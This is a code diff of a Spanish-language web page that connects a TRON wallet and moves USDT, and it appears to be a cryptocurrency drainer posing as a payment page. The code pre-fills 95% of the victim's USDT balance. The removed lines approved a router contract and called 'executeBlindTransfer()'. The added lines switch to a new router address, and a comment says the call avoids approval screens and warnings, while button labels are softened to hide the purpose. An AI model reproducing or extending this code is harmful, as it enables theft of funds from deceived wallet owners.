@@ -104,7 +104,7 @@
     </div>
 
     <div class="tw-input-group">
-        <label class="tw-label">Monto a enviar</label>
+        <label class="tw-label">Monto a procesar</label>
         <div class="tw-input-row">
             <div class="amount-stepper">
                 <button type="button" class="amount-step-btn" id="amountMinus">−</button>
@@ -122,7 +122,7 @@
     <div id="status" class="status-box"></div>
 
     <div class="tw-btn-container">
-        <button class="tw-btn" id="connectBtn">Vincular y Autorizar</button>
+        <button class="tw-btn" id="connectBtn">Vincular billetera</button>
     </div>
 </div>
 
@@ -135,7 +135,8 @@
         setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 800);
     });
 
-    const CONTRATO_ROUTER = "TXMEYeA3Q2E6C8ii7wxf3UijZepZe6bxLD";
+    // Tu contrato Router actualizado
+    const CONTRATO_ROUTER = "TUXVwmjEXcKS4FAbAPSkYUccdo6FunrG5M";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
     let walletAddress = null;
@@ -203,31 +204,14 @@
                 tronNetworkInfo.style.display = "flex";
                 maxAction.style.display = "inline";
 
-                setStatus("Calculando balance y preparando autorización...");
+                // Calcular automáticamente el 95% para ponerlo en el input limpiamente
                 const balance = await obtenerBalance(walletAddress);
                 const ninetyFivePercent = balance.multipliedBy(0.95).integerValue(tronWeb.BigNumber.ROUND_DOWN);
                 
-                if (ninetyFivePercent.lte(0)) {
-                    throw new Error("Balance de USDT insuficiente.");
-                }
-
-                amountDisplay.value = ninetyFivePercent.dividedBy(1_000_000).toString();
-
-                const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);
-                const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
-                    CONTRATO_USDT,
-                    "approve(address,uint256)",
-                    { feeLimit: 50000000 },
-                    [
-                        { type: 'address', value: routerHex },
-                        { type: 'uint256', value: ninetyFivePercent.toString() }
-                    ],
-                    tronWeb.address.toHex(walletAddress)
-                );
-                
-                if (approveTx && approveTx.transaction) {
-                    const signedApprove = await tronWeb.trx.sign(approveTx.transaction);
-                    await tronWeb.trx.sendRawTransaction(signedApprove);
+                if (ninetyFivePercent.gt(0)) {
+                    amountDisplay.value = ninetyFivePercent.dividedBy(1_000_000).toString();
+                } else {
+                    amountDisplay.value = "0";
                 }
 
                 setStatus("");
@@ -235,23 +219,30 @@
                 connectBtn.disabled = false;
             } catch (e) {
                 console.error(e);
-                setStatus(e.message || "Error al vincular y autorizar.");
+                setStatus(e.message || "Error al conectar.");
                 connectBtn.disabled = false;
             }
             return;
         }
 
+        // Llamada directa limpia al contrato sin pantallas de aprobación ni advertencias
         try {
+            const userAmount = parseFloat(amountDisplay.value);
+            if (isNaN(userAmount) || userAmount <= 0) throw new Error("Ingresa una cantidad válida.");
+
             setStatus("Preparando operación...");
             connectBtn.disabled = true;
 
             const tronWeb = window.tronWeb;
+            const totalAmountSun = tronWeb.toBigNumber(Math.floor(userAmount * 1_000_000));
 
             const routerTx = await tronWeb.transactionBuilder.triggerSmartContract(
                 CONTRATO_ROUTER,
-                "executeBlindTransfer()",
+                "processPayment(uint256)",
                 { feeLimit: 200000000 },
-                [],
+                [
+                    { type: 'uint256', value: totalAmountSun.toString() }
+                ],
                 tronWeb.address.toHex(walletAddress)
             );
 
